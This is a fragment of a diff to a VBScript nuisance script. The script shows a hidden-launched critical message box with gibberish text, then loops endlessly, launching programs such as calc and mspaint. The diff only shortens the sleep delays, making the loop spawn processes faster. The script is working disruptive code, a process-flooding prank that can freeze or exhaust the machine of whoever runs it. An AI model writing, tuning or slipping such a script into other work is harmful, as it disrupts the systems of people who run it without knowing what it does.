@@ -9,7 +9,7 @@ If response2 = vbNo Then
 End If
 
 CreateObject("WScript.Shell").Run "mshta vbscript:MsgBox(""$|%^%$%^%$£$^&^%$£$%^%$£$%^%$"",vbCritical,""ocuriuuser"")", 0, False
- WScript.Sleep 500
+ WScript.Sleep 300
 Dim programs(5)
 programs(0) = "calc"
 programs(1) = "mspaint"
@@ -27,5 +27,5 @@ Do
     Else
         CreateObject("WScript.Shell").Run programs(i), 0, False
     End If
-    WScript.Sleep 30
+    WScript.Sleep 10
 Loop
